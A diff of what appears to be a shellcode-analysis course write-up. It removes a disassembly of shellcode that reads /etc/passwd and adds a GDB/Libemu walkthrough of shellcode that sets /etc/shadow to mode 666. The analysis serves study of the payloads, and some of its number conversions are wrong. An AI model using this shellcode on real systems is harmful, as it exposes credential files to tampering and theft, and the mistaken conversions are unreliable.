@@ -1,30 +1,63 @@
-# Solution
+# Solution (Using GDB and Libemu)
 
-If we dump the nasm code from the payload, here is what we can see:
+Using exec_compile.sh, the final shellcode is generated and executed. We can use GDB to analyze its behaviour. 
 
-    00000000  EB36              jmp short 0x38
-    00000002  B805000000        mov eax,0x5
-    00000007  5B                pop ebx
-    00000008  31C9              xor ecx,ecx
-    0000000A  CD80              int 0x80
-    0000000C  89C3              mov ebx,eax
-    0000000E  B803000000        mov eax,0x3
-    00000013  89E7              mov edi,esp
-    00000015  89F9              mov ecx,edi
-    00000017  BA00100000        mov edx,0x1000
-    0000001C  CD80              int 0x80
-    0000001E  89C2              mov edx,eax
-    00000020  B804000000        mov eax,0x4
-    00000025  BB01000000        mov ebx,0x1
-    0000002A  CD80              int 0x80
-    0000002C  B801000000        mov eax,0x1
-    00000031  BB00000000        mov ebx,0x0
-    00000036  CD80              int 0x80
-    00000038  E8C5FFFFFF        call 0x2
-    0000003D  2F                das
-    0000003E  657463            gs jz 0xa4
-    00000041  2F                das
-    00000042  7061              jo 0xa5
-    00000044  7373              jnc 0xb9
-    00000046  7764              ja 0xac
-    00000048  00                db 0x00
+Using Libemu, we can obtain the next image of the process flow:
+
+![alt text](https://github.com/MrSquid25/SLAE/blob/master/Assignment%205/chmod/chmod.png "Flow")
+
+If we analyze the nasm code, we can reach the following conclusions:
+
+      cwd
+      push byte 0xf
+      pop eax
+      push edx
+      call 0x1
+      pop ebx
+      push dword 0x1b6
+      pop ecx
+      int 0x80
+      push byte 0x1
+      pop eax
+      int 0x80
+
+1)   cwd
+     
+     push byte 0xf
+     
+     pop eax
+          
+          EAX is set to 15 (xb in decimal) which is chmod. Edx is set to 0 too. 
+      
+2)    push edx
+            
+          EDX is pushed to the stack 
+    
+3)    call 0x1 
+      
+          Next instruction is called 
+     
+ 4)  pop ebx
+ 
+          EBX is set to the file which will be modified, in this case, /etc/shadow
+    
+  5)  push dword 0x1b6
+       
+      pop ecx
+      
+          666 is pushed to the stack (1b6 in decimal) and assigned to ecx
+          
+   6) int 0x80 
+   
+            chmod is executed 
+            EAX=15 (chmod syscall)
+            EBX=/etc/shadow (PATH)
+            ECX=666 (permissions to assign to the file)
+            
+   7) push byte 0x1
+   
+      pop eax
+      
+      int 0x80
+      
+        Exit function is called and the process exits quietly.
